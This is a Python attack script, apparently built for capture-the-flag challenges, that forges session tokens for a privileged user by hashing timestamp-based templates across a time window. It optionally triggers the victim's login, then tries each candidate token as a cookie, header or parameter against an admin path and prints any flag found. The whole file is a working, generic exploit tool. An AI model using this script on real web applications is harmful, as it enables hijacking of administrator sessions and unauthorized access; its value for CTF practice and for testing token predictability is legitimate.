#!/usr/bin/env python3
"""Brute-force a time-derived session token for a privileged user.

1. (optional) POST --trigger to make the privileged account log in now
2. for every timestamp in [t0-window, t1+window] build the token from --fmt
3. present it (cookie / header / param) to --check and look for --success

--fmt is "algo:template" with {ts} (unix seconds), {ms} (milliseconds), {user}.

    python ts_token_brute.py http://auth9.chal.deti:8068 --trigger /bot/refresh-oncall \
        --check /ticket/admin --cookie-name token --fmt 'sha1:admin:{ts}'
    python ts_token_brute.py http://t --check /admin --header 'X-Auth' --fmt 'md5:{user}{ts}' --user root
"""
import argparse
import hashlib
import re
import time

import requests

FLAG = re.compile(r"flag\{[^}]+\}")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--trigger", help="path to POST that makes the victim log in")
    ap.add_argument("--trigger-method", default="POST")
    ap.add_argument("--check", required=True, help="privileged path to test the token on")
    ap.add_argument("--fmt", required=True)
    ap.add_argument("--user", default="admin")
    ap.add_argument("--cookie-name")
    ap.add_argument("--header")
    ap.add_argument("--param")
    ap.add_argument("--window", type=int, default=5)
    ap.add_argument("--success", default="flag{", help="text that proves success")
    a = ap.parse_args()
    base = a.url.rstrip("/")
    algo, tpl = a.fmt.split(":", 1)
    t0 = int(time.time())
    if a.trigger:
        r = requests.request(a.trigger_method, base + a.trigger, timeout=15)
        print(f"[trigger] {r.status_code}")
    t1 = int(time.time())
    for ts in range(t0 - a.window, t1 + a.window + 1):
        for ms_off in ([0] if "{ms}" not in tpl else range(0, 1000)):
            raw = tpl.format(ts=ts, ms=ts * 1000 + ms_off, user=a.user)
            tok = hashlib.new(algo, raw.encode()).hexdigest()
            kw = {}
            if a.cookie_name:
                kw["cookies"] = {a.cookie_name: tok}
            if a.header:
                kw["headers"] = {a.header: tok}
            if a.param:
                kw["params"] = {a.param: tok}
            r = requests.get(base + a.check, timeout=10, **kw)
            if a.success in r.text:
                print(f"[+] ts={ts} input={raw!r} token={tok}")
                for f in FLAG.findall(r.text):
                    print(f"[FLAG] {f}")
                return 0
    print("[-] not found; widen --window or check --fmt")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
